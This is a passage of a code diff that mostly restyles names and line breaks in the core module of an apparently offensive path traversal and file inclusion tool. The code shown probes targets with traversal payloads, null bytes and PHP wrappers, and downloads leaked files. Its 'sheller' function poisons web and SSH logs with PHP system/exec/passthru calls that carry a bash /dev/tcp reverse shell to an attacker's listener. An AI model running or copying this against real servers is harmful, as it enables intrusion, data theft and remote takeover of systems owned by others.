@@ -30,11 +30,11 @@ import core.variables as vars
 
 from core.methods.session import session, random_ua
 from core.colors import color
-from core.variables import payloadlist, nullchars, rce, isWindows, phase1_wrappers
+from core.variables import payloadlist, nullchars, rce, is_windows, phase1_wrappers
 from core.methods.filecheck import filecheck
 from core.methods.loot import download
-from core.methods.progress import progress, progresswin, progressgui
-from core.methods.cookie import cookieFromFile
+from core.methods.progress import progress, progress_win, progress_gui
+from core.methods.cookie import cookie_from_file
 from core.methods.list import filegen
 from core.methods.notify import notify
 from urllib.parse import unquote
@@ -45,19 +45,19 @@ maxlen = len(max(payloadlist, key=len))
 global nullen
 nullen = len(max(nullchars, key=len))
 
-requestcount = 0
+request_count = 0
 
 lock = multiprocessing.Lock()
 
 
-def resetCounter():
+def reset_counter():
     """
     reset the request counter
     """
     lock.acquire()
     try:
-        global requestcount
-        requestcount = 0
+        global request_count
+        request_count = 0
     finally:
         lock.release()
 
@@ -72,7 +72,7 @@ def inpath(traverse, dir, file, nb, url, url2, s):
     """
     path = traverse + dir + file + nb + url2
     p = traverse + dir + file + nb
-    req = requests.Request(method='GET', url=url)
+    req = requests.Request(method="GET", url=url)
     prep = s.prepare_request(req)
     prep.url = url + path
     return (prep, p)
@@ -87,13 +87,13 @@ def query(traverse, dir, file, nb, keyword, url, url2, s):
     else:
         query = "&" + keyword + "=" + traverse + dir + file + nb + url2
     p = traverse + dir + file + nb
-    req = requests.Request(method='GET', url=url)
+    req = requests.Request(method="GET", url=url)
     prep = s.prepare_request(req)
     prep.url = url + query
     return (prep, p)
 
 
-def fixURL(url, attack):
+def fix_url(url, attack):
     """
     reformat potentially misformated URLs to the attack expectations.
     @params:
@@ -117,7 +117,7 @@ def fixURL(url, attack):
     return url
 
 
-def initialPing(s, attack, url, url2, keyword, timeout):
+def initial_ping(s, attack, url, url2, keyword, timeout):
     """
     performs the initial requests needed for the vulnerability analysis.
     @params:
@@ -133,33 +133,51 @@ def initialPing(s, attack, url, url2, keyword, timeout):
     if attack != 4:
         try:
             con2 = s.get(url, timeout=timeout).content
-        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+        except (
+            requests.exceptions.Timeout,
+            requests.exceptions.ConnectionError,
+        ):
             sys.exit("Timeout on initial check.")
     else:
         try:
             con2 = s.post(url, data={}, timeout=timeout).content
-        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+        except (
+            requests.exceptions.Timeout,
+            requests.exceptions.ConnectionError,
+        ):
             sys.exit("Timeout on initial check.")
 
     con3 = None
     if attack == 1:
         try:
-            con3 = s.get(url + "?" + keyword + "=vailyn" + url2, timeout=timeout).content
-        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+            con3 = s.get(
+                url + "?" + keyword + "=vailyn"
+                + url2, timeout=timeout
+            ).content
+        except (
+            requests.exceptions.Timeout,
+            requests.exceptions.ConnectionError,
+        ):
             sys.exit("Timeout on initial check.")
     elif attack == 2:
         try:
             protocol = url.split("://")[0]
             root = protocol + "://" + url.split("://")[1].split("/")[0] + "/"
             con3 = s.get(root, timeout=timeout).content
-        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+        except (
+            requests.exceptions.Timeout,
+            requests.exceptions.ConnectionError,
+        ):
             sys.exit("Timeout on initial check.")
 
     return (con2, con3)
 
 
-def attackRequest(s, attack, url, url2, keyword, selected, traverse, file, directory, nullbyte,
-                  postdata, timeout, phase2=False, sheller=False, w=""):
+def attack_request(
+        s, attack, url, url2, keyword, selected, traverse,
+        file, directory, nullbyte, post_data, timeout,
+        phase2=False, sheller=False, w=""
+    ):
     """
     This method executes the attack request and returns the result to the caller.
     @params:
@@ -171,32 +189,41 @@ def attackRequest(s, attack, url, url2, keyword, selected, traverse, file, direc
     requestlist = []
     data = {}
     if attack == 1:
-        prep, p = query(traverse, directory, file, nullbyte, keyword, url, url2, s)
+        prep, p = query(
+            traverse, directory, file, nullbyte,
+            keyword, url, url2, s,
+        )
         random_ua(s)
         r = s.send(prep, timeout=timeout)
     elif attack == 2:
-        prep, p = inpath(traverse, directory, file, nullbyte, url, url2, s)
+        prep, p = inpath(
+            traverse, directory, file, nullbyte,
+            url, url2, s,
+        )
         random_ua(s)
         r = s.send(prep, timeout=timeout)
     elif attack == 3:
-        s.cookies.set(selected, traverse + directory + file + nullbyte)
+        s.cookies.set(
+            selected,
+            traverse + directory + file + nullbyte,
+        )
         p = traverse + directory + file + nullbyte
         random_ua(s)
         r = s.get(url, timeout=timeout)
     elif attack == 4:
         p = traverse + directory + file + nullbyte
-        for prop in postdata.split("&"):
+        for prop in post_data.split("&"):
             pair = prop.split("=")
             if pair[1].strip() == "INJECT":
                 pair[1] = p
             data[pair[0].strip()] = pair[1].strip()
         assert data != {}
         random_ua(s)
-        req = requests.Request(method='POST', url=url, data=data)
+        req = requests.Request(method="POST", url=url, data=data)
         prep = s.prepare_request(req)
-        newBody = unquote(prep.body)
-        prep.body = newBody
-        prep.headers["content-length"] = len(newBody)
+        new_body = unquote(prep.body)
+        prep.body = new_body
+        prep.headers["content-length"] = len(new_body)
         r = s.send(prep, timeout=timeout)
 
     try:
@@ -212,8 +239,10 @@ def attackRequest(s, attack, url, url2, keyword, selected, traverse, file, direc
     return requestlist
 
 
-def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist, file, authcookie,
-           postdata, gui):
+def phase1(
+        attack, url, url2, keyword, cookie, selected, verbose,
+        depth, paylist, file, authcookie, post_data, gui
+    ):
     """
     [Phase 1]: Vulnerability Analysis
     @params:
@@ -228,31 +257,31 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
         paylist    - payload list (all)
         file       - file to be looked up (-i FIL, default: /etc/passwd)
         authcookie - Authentication Cookie File to bypass Login Screens
-        postdata   - POST Data for --attack 4
+        post_data   - POST Data for --attack 4
         gui        - GUI frame to set the graphical progress bar
     """
     # variables for the progress counter
-    global requestcount
+    global request_count
     precise = vars.precise
 
     prefixes = [""]
     if vars.lfi:
         prefixes += phase1_wrappers
 
-    totalrequests = len(payloadlist) * (len(nullchars) + 1) * len(prefixes)
+    total_requests = len(payloadlist) * (len(nullchars) + 1) * len(prefixes)
     if not precise:
-        totalrequests = totalrequests * (depth)
+        total_requests = total_requests * (depth)
     timeout = vars.timeout
     if gui:
         lock.acquire()
         try:
             gui.progressBar.reset()
             gui.progressBar.setMinimum(0)
-            gui.progressBar.setMaximum(totalrequests)
+            gui.progressBar.setMaximum(total_requests)
         finally:
             lock.release()
 
-    url = fixURL(url, attack)
+    url = fix_url(url, attack)
 
     # initialize lists & session
     payloads = []
@@ -261,11 +290,11 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
     s = session()
 
     if authcookie != "":
-        tmpjar = cookieFromFile(authcookie)
+        tmpjar = cookie_from_file(authcookie)
         for cookie in tmpjar:
             s.cookies.set_cookie(cookie)
 
-    con2, con3 = initialPing(s, attack, url, url2, keyword, timeout)
+    con2, con3 = initial_ping(s, attack, url, url2, keyword, timeout)
 
     for i in paylist:
         if precise:
@@ -274,7 +303,7 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
             layers = list(range(1, depth + 1))
 
         for d in layers:
-            traverse = ''
+            traverse = ""
             j = 1
             # chain traversal payloads
             while j <= d:
@@ -286,21 +315,29 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
             for prefix in prefixes:
                 combined = prefix + traverse
                 try:
-                    requestlist += attackRequest(
-                        s, attack, url, url2, keyword, selected, combined, file, "", "", postdata,
+                    requestlist += attack_request(
+                        s, attack, url, url2, keyword, selected,
+                        combined, file, "", "", post_data,
                         timeout, w=prefix,
                     )
-                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                except (
+                    requests.exceptions.Timeout,
+                    requests.exceptions.ConnectionError
+                ):
                     print("Timeout reached for " + url)
 
                 # repeat for nullbytes
                 for nb in nullchars:
                     try:
-                        requestlist += attackRequest(
-                            s, attack, url, url2, keyword, selected, combined, file, "", nb, postdata,
+                        requestlist += attack_request(
+                            s, attack, url, url2, keyword, selected,
+                            combined, file, "", nb, post_data,
                             timeout, w=prefix,
                         )
-                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                    except (
+                        requests.exceptions.Timeout,
+                        requests.exceptions.ConnectionError
+                    ):
                         print("Timeout reached for " + url)
 
             # analyze result
@@ -308,19 +345,28 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
             for (r, p, nb, w) in requestlist:
                 lock.acquire()
                 try:
-                    requestcount += 1
+                    request_count += 1
                     if gui:
-                        progressgui(requestcount, totalrequests, gui)
+                        progress_gui(request_count, total_requests, gui)
                     else:
-                        if sys.platform.lower().startswith('win'):
-                            if requestcount % 1000 == 0:
-                                progresswin(requestcount, totalrequests, prefix=" ", suffix=" ")
+                        if is_windows:
+                            if request_count % 1000 == 0:
+                                progress_win(
+                                    request_count,
+                                    total_requests,
+                                    prefix=" ", suffix=" ",
+                                )
                         else:
-                            progress(requestcount, totalrequests, prefix=" ", suffix=" ")
+                            progress(
+                                request_count,
+                                total_requests,
+                                prefix=" ", suffix=" ",
+                            )
                 finally:
                     lock.release()
                 if str(r.status_code).startswith("2"):
-                    if filecheck(r, con2, con3, p) and attack != 4 or filecheck(r, con2, con3, p, post=True) and attack == 4:
+                    if (filecheck(r, con2, con3, p) and attack != 4
+                            or filecheck(r, con2, con3, p, post=True) and attack == 4):
                         payloads.append(i)
                         if nb != "":
                             nullbytes.append(nb)
@@ -328,7 +374,8 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
                             found_prefixes.append(w)
                         found = True
 
-                        out = color.RD + "[pl]" + color.END + color.O + " " + str(r.status_code) + color.END + " "
+                        out = color.RD + "[pl]" + color.END + color.O
+                        out = out + " " + str(r.status_code) + color.END + " "
                         out = out + "{0:{1}}".format(i, maxlen) + " "
                         out = out + "{0:{1}}".format(nb, nullen) + " " + w
 
@@ -337,7 +384,9 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
                     if attack == 1 or attack == 2:
                         print(color.END + "{}|: ".format(r.status_code)+r.url)
                     elif attack == 3 or attack == 4:
-                        print(color.END + "{}|: ".format(r.status_code)+r.url + " : " + p)
+                        print(color.END + "{}|: ".format(
+                            r.status_code)+r.url + " : " + p
+                        )
 
             if found:
                 break
@@ -345,8 +394,12 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
     return (payloads, nullbytes, found_prefixes)
 
 
-def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth, verbose, dl,
-           selected_payloads, selected_nullbytes, selected_prefixes, authcookie, postdata, dirlen, gui):
+def phase2(
+        attack, url, url2, keyword, cookie, selected, filespath,
+        dirs, depth, verbose, dl, selected_payloads,
+        selected_nullbytes, selected_prefixes, authcookie,
+        post_data, dirlen, gui
+    ):
     """
     [Phase 2]: Exploitation
     @params:
@@ -365,30 +418,31 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
         selected_nullbytes - terminators selected in phase 1
         selected_prefixes  - PHP wrappers selected in phase 1
         authcookie         - Authentication Cookie File to bypass Login Screens
-        postdata           - POST Data for --attack 4
+        post_data           - POST Data for --attack 4
         dirlen             - total directory dictionary size (after permutations)
         gui                - GUI frame to set the graphical progress bar
     """
     # variables for the progress counter
-    global requestcount
+    global request_count
     timeout = vars.timeout
     fileslen = sum(1 for dummy in filegen(filespath))
     if len(selected_nullbytes) == 0:
-        totalrequests = len(selected_payloads) * fileslen * dirlen * depth
+        total_requests = len(selected_payloads) * fileslen * dirlen * depth
     else:
-        totalrequests = len(selected_payloads) * len(selected_nullbytes) * fileslen * dirlen * depth
-    totalrequests *= len(selected_prefixes)
+        total_requests = len(selected_payloads) * len(selected_nullbytes)
+        total_requests = total_requests * fileslen * dirlen * depth
+    total_requests *= len(selected_prefixes)
 
     if gui:
         lock.acquire()
         try:
             gui.progressBar.reset()
             gui.progressBar.setMinimum(0)
-            gui.progressBar.setMaximum(totalrequests)
+            gui.progressBar.setMaximum(total_requests)
         finally:
             lock.release()
 
-    url = fixURL(url, attack)
+    url = fix_url(url, attack)
 
     # initialize lists & session
     found = []
@@ -396,11 +450,11 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
     s = session()
 
     if authcookie != "":
-        tmpjar = cookieFromFile(authcookie)
+        tmpjar = cookie_from_file(authcookie)
         for cookie in tmpjar:
             s.cookies.set_cookie(cookie)
 
-    con2, con3 = initialPing(s, attack, url, url2, keyword, timeout)
+    con2, con3 = initial_ping(s, attack, url, url2, keyword, timeout)
 
     try:
         for dir in dirs:
@@ -409,7 +463,7 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
                 d = 1
                 while d <= depth:
                     for i in selected_payloads:
-                        traverse = ''
+                        traverse = ""
                         j = 1
                         # chain traversal payloads
                         while j <= d:
@@ -422,21 +476,29 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
                             combined = prefix + traverse
                             if selected_nullbytes == []:
                                 try:
-                                    requestlist += attackRequest(
-                                        s, attack, url, url2, keyword, selected, combined, file, dir, "",
-                                        postdata, timeout, phase2=True
+                                    requestlist += attack_request(
+                                        s, attack, url, url2, keyword,
+                                        selected, combined, file, dir, "",
+                                        post_data, timeout, phase2=True,
                                     )
-                                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                except (
+                                    requests.exceptions.Timeout,
+                                    requests.exceptions.ConnectionError
+                                ):
                                     print("Timeout reached for " + url)
                                     continue
                             else:
                                 for nb in selected_nullbytes:
                                     try:
-                                        requestlist += attackRequest(
-                                            s, attack, url, url2, keyword, selected, combined, file, dir, nb,
-                                            postdata, timeout, phase2=True
+                                        requestlist += attack_request(
+                                            s, attack, url, url2, keyword,
+                                            selected, combined, file, dir, nb,
+                                            post_data, timeout, phase2=True,
                                         )
-                                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                    except (
+                                        requests.exceptions.Timeout,
+                                        requests.exceptions.ConnectionError
+                                    ):
                                         print("Timeout reached for " + url)
                                         continue
 
@@ -444,15 +506,27 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
                         for (r, p, data) in requestlist:
                             lock.acquire()
                             try:
-                                requestcount += 1
+                                request_count += 1
                                 if gui:
-                                    progressgui(requestcount, totalrequests, gui)
+                                    progress_gui(
+                                        request_count,
+                                        total_requests,
+                                        gui,
+                                    )
                                 else:
-                                    if sys.platform.lower().startswith('win'):
-                                        if requestcount % 1000 == 0:
-                                            progresswin(requestcount, totalrequests, prefix=" ", suffix=" ")
+                                    if is_windows:
+                                        if request_count % 1000 == 0:
+                                            progress_win(
+                                                request_count,
+                                                total_requests,
+                                                prefix=" ", suffix=" ",
+                                            )
                                     else:
-                                        progress(requestcount, totalrequests, prefix=" ", suffix=" ")
+                                        progress(
+                                            request_count,
+                                            total_requests,
+                                            prefix=" ", suffix=" ",
+                                        )
                             finally:
                                 lock.release()
 
@@ -493,7 +567,7 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
                                     elif attack == 4:
                                         print(color.RD + "[INFO]" + color.O + " leak" + color.END +
                                               "       " + color.RD + "statvs-code" + color.END + "=" + color.O
-                                              + str(r.status_code) + color.END + " " + color.R + "postdata"
+                                              + str(r.status_code) + color.END + " " + color.R + "post_data"
                                               + color.END + "=" + p)
 
                                         if dl and dir + file not in found:
@@ -513,25 +587,36 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
         return (found, urls)
 
 
-def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist, wlist,
-            authcookie, postdata, depth, gui, app):
+def sheller(
+        technique, attack, url, url2, keyword, cookie, selected,
+        verbose, paylist, nullist, wlist,
+        authcookie, post_data, depth, gui, app
+    ):
     """
     second exploitation module: try to gain a reverse shell over the system
     @params:
         technique - technique index (see variables.rce)
     """
     # TODO clean me up
-    url = fixURL(url, attack)
+    url = fix_url(url, attack)
 
     s = session()
     timeout = vars.timeout
 
     success = None
 
-    print(color.RD+"[INFO]" + color.O + " RCE" + color.END + color.RD + "|" + color.END + "  "
-          + color.RC + "Using Technique:" + color.END + color.O + "" + str(rce[technique]) + color.END)
+    print(
+        color.RD+"[INFO]" + color.O + " RCE" + color.END
+        + color.RD + "|" + color.END + "  "
+        + color.RC + "Using Technique:" + color.END + color.O
+        + "" + str(rce[technique]) + color.END
+    )
     if gui:
-        gui.crawlerResultDisplay.append("[Info] RCE|  Using Technique: {}".format(str(rce[technique])))
+        gui.crawlerResultDisplay.append(
+            "[Info] RCE|  Using Technique: {}".format(
+                str(rce[technique])
+            )
+        )
         gui.show()
         app.processEvents()
 
@@ -549,18 +634,20 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
         success = ["something here"]
 
     if authcookie != "":
-        tmpjar = cookieFromFile(authcookie)
+        tmpjar = cookie_from_file(authcookie)
         for cookie in tmpjar:
             s.cookies.set_cookie(cookie)
 
-    con2, con3 = initialPing(s, attack, url, url2, keyword, timeout)
+    con2, con3 = initial_ping(s, attack, url, url2, keyword, timeout)
 
     if technique != 6:
-        sys.stdout.write("{0} └── Looking for Log File:{1}".format(color.RD, color.END))
+        sys.stdout.write("{0} └── Looking for Log File:{1}".format(
+            color.RD, color.END
+        ))
         for i in paylist:
             d = 1
             while d <= depth:
-                traverse = ''
+                traverse = ""
                 j = 1
                 # chain traversal payloads
                 while j <= d:
@@ -573,20 +660,28 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                     combined = prefix + traverse
                     if nullist == []:
                         try:
-                            requestlist += attackRequest(
-                                s, attack, url, url2, keyword, selected, combined, file, "", "",
-                                postdata, timeout, sheller=True
+                            requestlist += attack_request(
+                                s, attack, url, url2, keyword,
+                                selected, combined, file, "", "",
+                                post_data, timeout, sheller=True,
                             )
-                        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                        except (
+                            requests.exceptions.Timeout,
+                            requests.exceptions.ConnectionError
+                        ):
                             print("Timeout reached for " + url)
                     else:
                         for nb in nullist:
                             try:
-                                requestlist += attackRequest(
-                                    s, attack, url, url2, keyword, selected, combined, file, "", nb,
-                                    postdata, timeout, sheller=True
+                                requestlist += attack_request(
+                                    s, attack, url, url2, keyword,
+                                    selected, combined, file, "", nb,
+                                    post_data, timeout, sheller=True,
                                 )
-                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                            except (
+                                requests.exceptions.Timeout,
+                                requests.exceptions.ConnectionError
+                            ):
                                 print("Timeout reached for " + url)
                                 continue
 
@@ -597,133 +692,196 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                         s.cookies.set(selected, p)
                     if str(r.status_code).startswith("2"):
                         if (filecheck(r, con2, con3, p) and attack != 4
-                                or filecheck(r, con2, con3, p, post=True) and attack == 4):
+                                or filecheck(r, con2, con3, p, post=True)
+                                and attack == 4):
                             success = (r, p, nb, data, traverse)
                             found = True
                             break
                     if verbose:
                         if attack == 1 or attack == 2:
-                            print(color.END + "{}|: ".format(r.status_code)+r.url)
+                            print(color.END + "{}|: ".format(
+                                r.status_code) + r.url
+                            )
                         elif attack == 3 or attack == 4:
-                            print(color.END + "{}|: ".format(r.status_code)+r.url + " : " + p)
+                            print(color.END + "{}|: ".format(
+                                r.status_code)+r.url + " : " + p
+                            )
                 d += 1
                 if found:
-                    sys.stdout.write("{0} OK  {2}|{1}\n".format(color.O, color.END, color.END + color.RD))
+                    sys.stdout.write(
+                        "{0} OK  {2}|{1}\n".format(
+                            color.O, color.END, color.END + color.RD
+                        )
+                    )
                     break
 
     if success:
-        PAYLOAD = "bash -i >& /dev/tcp/{}/{} 0>&1".format(vars.LISTENIP, vars.LISTENPORT)
+        PAYLOAD = "bash -i >& /dev/tcp/{}/{} 0>&1".format(
+            vars.LISTENIP, vars.LISTENPORT,
+        )
         if technique != 6:
             if attack == 1:
-                prep = query(success[4], "", file, success[2], keyword, url, url2, s)[0]
+                prep = query(
+                    success[4], "", file, success[2], keyword,
+                    url, url2, s,
+                )[0]
             elif attack == 2:
-                prep = inpath(success[4], "", file, success[2], url, url2, s)[0]
+                prep = inpath(
+                    success[4], "", file, success[2], url,
+                    url2, s,
+                )[0]
             elif attack == 3:
                 s.cookies.set(selected, success[1])
-                req = requests.Request(method='GET', url=url)
+                req = requests.Request(method="GET", url=url)
                 prep = s.prepare_request(req)
             elif attack == 4:
-                req = requests.Request(method='POST', url=url, data=success[3])
+                req = requests.Request(
+                    method="POST", url=url, data=success[3]
+                )
                 prep = s.prepare_request(req)
-                newBody = unquote(prep.body)
-                prep.body = newBody
-                prep.headers["content-length"] = len(newBody)
+                new_body = unquote(prep.body)
+                prep.body = new_body
+                prep.headers["content-length"] = len(new_body)
 
         if technique == 1:
-            prep.headers['User-agent'] = '<?php system("{}"); ?>'.format(PAYLOAD)
-            sys.stdout.write("{0}  : Trying system():{1}      ".format(color.RD, color.END))
+            prep.headers["User-agent"] = '<?php system("{}"); ?>'.format(PAYLOAD)
+            sys.stdout.write("{0}  : Trying system():{1}      ".format(
+                color.RD, color.END
+            ))
             if gui:
-                gui.crawlerResultDisplay.append("  : Trying {}".format("system():      "))
+                gui.crawlerResultDisplay.append(
+                    "  : Trying {}".format("system():      "
+                ))
                 gui.show()
                 app.processEvents()
             try:
                 s.send(prep, timeout=timeout)
-                showStatus(gui)
+                show_status(gui)
                 if app:
                     app.processEvents()
-            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                showStatus(gui, timeout=True)
+            except (
+                requests.exceptions.Timeout,
+                requests.exceptions.ConnectionError,
+            ):
+                show_status(gui, timeout=True)
                 if app:
                     app.processEvents()
-            prep.headers['User-agent'] = '<?php exec("{}"); ?>'.format(PAYLOAD)
-            sys.stdout.write("{0}  : Trying exec():{1}        ".format(color.RD, color.END))
+            prep.headers["User-agent"] = '<?php exec("{}"); ?>'.format(PAYLOAD)
+            sys.stdout.write("{0}  : Trying exec():{1}        ".format(
+                color.RD, color.END,
+            ))
             if gui:
-                gui.crawlerResultDisplay.append("  : Trying {}".format("exec():        "))
+                gui.crawlerResultDisplay.append(
+                    "  : Trying {}".format("exec():        "
+                ))
                 gui.show()
                 app.processEvents()
             try:
                 s.send(prep, timeout=timeout)
-                showStatus(gui)
+                show_status(gui)
                 if app:
                     app.processEvents()
-            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                showStatus(gui, timeout=True)
+            except (
+                requests.exceptions.Timeout,
+                requests.exceptions.ConnectionError
+            ):
+                show_status(gui, timeout=True)
                 if app:
                     app.processEvents()
-            prep.headers['User-agent'] = '<?php passthru("{}"); ?>'.format(PAYLOAD)
-            sys.stdout.write("{0}  : Trying passthru():{1}    ".format(color.RD, color.END))
+            prep.headers["User-agent"] = '<?php passthru("{}"); ?>'.format(PAYLOAD)
+            sys.stdout.write("{0}  : Trying passthru():{1}    ".format(
+                color.RD, color.END
+            ))
             if gui:
-                gui.crawlerResultDisplay.append("  : Trying {}".format("passthru():    "))
+                gui.crawlerResultDisplay.append(
+                    "  : Trying {}".format("passthru():    "
+                ))
                 gui.show()
                 app.processEvents()
             try:
                 s.send(prep, timeout=timeout)
-                showStatus(gui)
+                show_status(gui)
                 if app:
                     app.processEvents()
-            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                showStatus(gui, timeout=True)
+            except (
+                requests.exceptions.Timeout,
+                requests.exceptions.ConnectionError,
+            ):
+                show_status(gui, timeout=True)
                 if app:
                     app.processEvents()
         elif technique == 2 or technique == 5:
-            req = requests.Request(method='GET', url=url)
+            req = requests.Request(method="GET", url=url)
             prep2 = s.prepare_request(req)
             prep2.url = url + "/" + '<?php system("{}"); ?>'.format(PAYLOAD)
-            sys.stdout.write("{0}  : Trying system():{1}      ".format(color.RD, color.END))
+            sys.stdout.write("{0}  : Trying system():{1}      ".format(
+                color.RD, color.END,
+            ))
             if gui:
-                gui.crawlerResultDisplay.append("  : Trying {}".format("system():      "))
+                gui.crawlerResultDisplay.append(
+                    "  : Trying {}".format("system():      "),
+                )
                 gui.show()
                 app.processEvents()
             try:
                 s.send(prep2, timeout=timeout)
                 s.send(prep, timeout=timeout)
-                showStatus(gui)
+                show_status(gui)
                 if app:
                     app.processEvents()
-            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                showStatus(gui, timeout=True)
+            except (
+                requests.exceptions.Timeout,
+                requests.exceptions.ConnectionError,
+            ):
+                show_status(gui, timeout=True)
                 if app:
                     app.processEvents()
             prep2.url = url + "/" + '<?php exec("{}"); ?>'.format(PAYLOAD)
-            sys.stdout.write("{0}  : Trying exec():{1}        ".format(color.RD, color.END))
+            sys.stdout.write(
+                "{0}  : Trying exec():{1}        ".format(
+                    color.RD, color.END
+                )
+            )
             if gui:
-                gui.crawlerResultDisplay.append("  : Trying {}".format("exec():        "))
+                gui.crawlerResultDisplay.append(
+                    "  : Trying {}".format("exec():        ")
+                )
                 gui.show()
                 app.processEvents()
             try:
                 s.send(prep2, timeout=timeout)
                 s.send(prep, timeout=timeout)
-                showStatus(gui)
+                show_status(gui)
                 if app:
                     app.processEvents()
-            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                showStatus(gui, timeout=True)
+            except (
+                requests.exceptions.Timeout,
+                requests.exceptions.ConnectionError,
+            ):
+                show_status(gui, timeout=True)
                 if app:
                     app.processEvents()
             prep2.url = url + "/" + '<?php passthru("{}"); ?>'.format(PAYLOAD)
-            sys.stdout.write("{0}  : Trying passthru():    {1}".format(color.RD, color.END))
+            sys.stdout.write("{0}  : Trying passthru():    {1}".format(
+                color.RD, color.END
+            ))
             if gui:
-                gui.crawlerResultDisplay.append("  : Trying {}".format("passthru():    "))
+                gui.crawlerResultDisplay.append(
+                    "  : Trying {}".format("passthru():    ")
+                )
                 gui.show()
                 app.processEvents()
             try:
                 s.send(prep2, timeout=timeout)
                 s.send(prep, timeout=timeout)
-                showStatus(gui)
+                show_status(gui)
                 if app:
                     app.processEvents()
-            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                showStatus(gui, timeout=True)
+            except (
+                requests.exceptions.Timeout,
+                requests.exceptions.ConnectionError,
+            ):
+                show_status(gui, timeout=True)
                 if app:
                     app.processEvents()
         elif technique == 3:
@@ -731,63 +889,99 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
             if "@" in tmp:
                 tmp = tmp.split("@")[1]
             host = tmp.split("/")[0].split(":")[0]
-            sshs = ['<?php system("{}"); ?>@{}'.format(PAYLOAD, host),
-                    '<?php exec("{}"); ?>@{}'.format(PAYLOAD, host),
-                    '<?php passthru("{}"); ?>@{}'.format(PAYLOAD, host)]
-            ssht = ["system():      ", "exec():        ", "passthru():    "]
+            sshs = [
+                '<?php system("{}"); ?>@{}'.format(PAYLOAD, host),
+                '<?php exec("{}"); ?>@{}'.format(PAYLOAD, host),
+                '<?php passthru("{}"); ?>@{}'.format(PAYLOAD, host)
+            ]
+            ssht = [
+                "system():      ",
+                "exec():        ",
+                "passthru():    "
+            ]
             for i in range(0, len(sshs)):
-                sys.stdout.write("{0}  : Trying {2}{1}".format(color.RD, color.END, ssht[i]))
+                sys.stdout.write("{0}  : Trying {2}{1}".format(
+                    color.RD, color.END, ssht[i]
+                ))
                 if gui:
-                    gui.crawlerResultDisplay.append("  : Trying {}".format(ssht[i]))
+                    gui.crawlerResultDisplay.append(
+                        "  : Trying {}".format(ssht[i])
+                    )
                     gui.show()
                     app.processEvents()
                 try:
-                    if isWindows:
-                        subprocess.run(["putty.exe", "-ssh", sshs[i]])
+                    if is_windows:
+                        subprocess.run(
+                            ["putty.exe", "-ssh", sshs[i]]
+                        )
                     else:
                         subprocess.run(["ssh", sshs[i]])
                 except Exception as e:
-                    showStatus(gui, exception=e)
+                    show_status(gui, exception=e)
                     if app:
                         app.processEvents()
                 try:
                     s.send(prep, timeout=timeout)
-                    showStatus(gui)
+                    show_status(gui)
                     if app:
                         app.processEvents()
-                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                    showStatus(gui, timeout=True)
+                except (
+                    requests.exceptions.Timeout,
+                    requests.exceptions.ConnectionError,
+                ):
+                    show_status(gui, timeout=True)
                     if app:
                         app.processEvents()
         elif technique == 4:
             tmp = url.split("://")[1]
             if "@" in tmp:
                 tmp = tmp.split("@")[1]
-            topics = ['I<3shells <?php system("{}"); ?>'.format(PAYLOAD),
-                      'I<3shells <?php exec("{}"); ?>'.format(PAYLOAD),
-                      'I<3shells <?php passthru("{}"); ?>'.format(PAYLOAD)]
-            topict = ["system():      ", "exec():        ", "passthru():    "]
+            topics = [
+                'I<3shells <?php system("{}"); ?>'.format(PAYLOAD),
+                'I<3shells <?php exec("{}"); ?>'.format(PAYLOAD),
+                'I<3shells <?php passthru("{}"); ?>'.format(PAYLOAD)
+            ]
+            topict = [
+                "system():      ",
+                "exec():        ",
+                "passthru():    "
+            ]
             host = tmp.split("/")[0].split(":")[0]
             for i in range(0, len(topics)):
-                sys.stdout.write("{0}  : Trying {2}{1}".format(color.RD, color.END, topict[i]))
+                sys.stdout.write("{0}  : Trying {2}{1}".format(
+                    color.RD,
+                    color.END,
+                    topict[i]
+                ))
                 if gui:
-                    gui.crawlerResultDisplay.append("  : Trying {}".format(topict[i]))
+                    gui.crawlerResultDisplay.append(
+                        "  : Trying {}".format(topict[i])
+                    )
                     gui.show()
                     app.processEvents()
                 try:
-                    p = subprocess.Popen(["echo", "Uno reverse shell"], stdout=subprocess.PIPE)
